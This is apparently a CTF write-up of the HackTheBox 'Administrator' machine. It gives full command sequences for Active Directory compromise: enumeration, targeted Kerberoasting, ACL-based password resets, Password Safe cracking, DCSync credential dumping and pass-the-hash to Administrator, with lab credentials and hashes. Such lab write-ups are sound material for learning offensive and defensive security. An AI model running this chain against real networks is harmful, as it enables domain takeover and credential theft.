---
layout: post
title: "HackTheBox — Administrator"
date: 2026-06-27
categories: [HackTheBox, Active Directory, Windows]
tags: [htb, ctf, active-directory, kerberoast, bloodhound, dcsync, ftp, winrm]
difficulty: Medium
os: Windows
---

# HackTheBox — Administrator

| Field        | Detail                      |
|--------------|-----------------------------|
| **OS**       | Windows Server 2022         |
| **Difficulty** | Medium                    |
| **Domain**   | administrator.htb           |
| **IP**       | 10.129.22.21                |

---

## Reconnaissance

### Port Scan

```bash
nmap -sCV -vv --disable-arp-ping --min-rate 5000 -p- 10.129.22.21 -oN fullport.nmap
```

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: administrator.htb)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        .NET Message Framing
```

The presence of **DNS (53)**, **Kerberos (88)**, **LDAP (389)** and **SMB (445)** confirms we are dealing with an **Active Directory Domain Controller**.

Add entry to `/etc/hosts`:

```bash
sudo nxc smb 10.129.22.21 --generate-hosts-file /etc/hosts
```

---

## Starting Credentials

```
Olivia : ichliebedich
```

---

## SMB Enumeration

### Accessible Shares

```bash
nxc smb 10.129.22.21 -u Olivia -p 'ichliebedich' --shares
```

```
Share        Permissions
-----        -----------
IPC$         READ
NETLOGON     READ
SYSVOL       READ
```

### Domain Users

```bash
nxc smb 10.129.22.21 -u Olivia -p 'ichliebedich' --users
```

```
Administrator, Guest, krbtgt, olivia, michael, benjamin, emily, ethan, alexander, emma
```

Generate a users list:

```bash
nxc smb 10.129.22.21 -u Olivia -p 'ichliebedich' --users | awk 'NR>7{print $5}' >> ad_users.txt
```

---

## BloodHound Enumeration

```bash
rusthound-ce -d administrator.htb -i 10.129.22.21 -u Olivia -p 'ichliebedich' -c All --zip
```

BloodHound analysis revealed the following ACL chain:

```
Olivia ──[GenericAll]──► michael ──[ForceChangePassword]──► benjamin
emily  ──[GenericWrite]──► ethan ──[DCSync / GetChanges]──► DC
```

Key findings:
- **Olivia** has `GenericAll` over **michael**
- **michael** belongs to `Remote Management Users` and has `ForceChangePassword` over **benjamin**
- **emily** has `GenericWrite` over **ethan**
- **ethan** has **DCSync** rights over the domain

---

## Foothold — Olivia → Michael

### Targeted Kerberoast

Leveraging Olivia's `GenericAll` over michael, we can add a temporary SPN and Kerberoast:

```bash
targetedKerberoast.py -v -d 'administrator.htb' -u 'Olivia' -p 'ichliebedich'
```

The hash obtained for **michael** could not be cracked. Instead, we reset his password directly:

```bash
bloodyAD --host 10.129.22.21 -d administrator.htb -u Olivia -p 'ichliebedich' set password michael 'password123!'
```

```
[+] Password changed successfully!
```

---

## WinRM Access — Michael

```bash
evil-winrm -i administrator.htb -u michael -p 'password123!'
```

Michael does not have the user flag. We move on to **benjamin** using the `ForceChangePassword` permission:

```bash
bloodyAD --host 10.129.22.21 -d administrator.htb -u michael -p 'password123!' set password Benjamin 'password123!'
```

---

## FTP — Benjamin → Emily

Benjamin has access to the FTP service. After authenticating, the following file was found:

```
Backup.psafe3
```

### Cracking the Password Safe

```bash
pwsafe2john Backup.psafe3 > Backup.psafe3.hash
john Backup.psafe3.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
tekieromucho     (Backup)
```

Credentials extracted from the vault:

```
alexander : UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily     : UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma      : WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

---

## User Flag — Emily

**emily** belongs to the `Remote Management Users` group:

```bash
evil-winrm -i administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

```
*Evil-WinRM* PS C:\Users\emily\Desktop> type user.txt
967ef90d0859f6adaf1ad67fda432e63
```

---

## Privilege Escalation

### Targeted Kerberoast — Emily → Ethan

Emily has `GenericWrite` over ethan, allowing us to add a temporary SPN and Kerberoast:

```bash
targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -v
```

Hash obtained for **ethan**. Crack with hashcat:

```bash
hashcat ethan.hash /usr/share/wordlists/rockyou.txt
```

```
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$...:limpbizkit
```

---

### DCSync — Ethan → Administrator

Ethan holds `GetChanges` and `GetChangesAll` rights over the domain, enabling a **DCSync** attack:

```bash
impacket-secretsdump administrator.htb/ethan:'limpbizkit'@10.129.22.21
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
```

### Pass-the-Hash as Administrator

```bash
evil-winrm -i administrator.htb -u Administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
<root_flag>
```

---

## Attack Chain

```
Olivia (initial creds)
  │
  ├─[GenericAll]──► michael  (password reset → WinRM)
  │                   │
  │           [ForceChangePassword]──► benjamin (FTP access)
  │                                        │
  │                                  Backup.psafe3
  │                                        │
  │                                emily credentials
  │
emily (WinRM → user.txt)
  │
  ├─[GenericWrite]──► ethan  (Targeted Kerberoast → limpbizkit)
  │                    │
  │               [DCSync]──► Administrator NT Hash
  │
Administrator (root.txt) ✓
```

---

## Tools Used

| Tool                   | Purpose                                 |
|------------------------|-----------------------------------------|
| nmap                   | Port scanning                           |
| netexec (nxc)          | SMB enumeration                         |
| rusthound-ce           | BloodHound data collection              |
| BloodHound             | AD attack path analysis                 |
| targetedKerberoast.py  | SPN-based Kerberoasting                 |
| bloodyAD               | Password reset via LDAP ACL abuse       |
| evil-winrm             | Remote shell via WinRM                  |
| pwsafe2john + john     | Password Safe cracking                  |
| hashcat                | Kerberos TGS hash cracking              |
| impacket-secretsdump   | DCSync / NTDS dump                      |

---

## Key Takeaways

- **BloodHound is essential** — without mapping the ACL chain, this attack path would be nearly invisible.
- **GenericAll / GenericWrite** are extremely dangerous permissions on user objects; they enable targeted Kerberoasting, SPN manipulation, and direct password resets.
- **Password Safes stored on accessible shares** are a classic credential exposure vector — always treat them as sensitive as the credentials inside.
- **DCSync** does not require physical access to the DC; only the right Active Directory permissions.

---
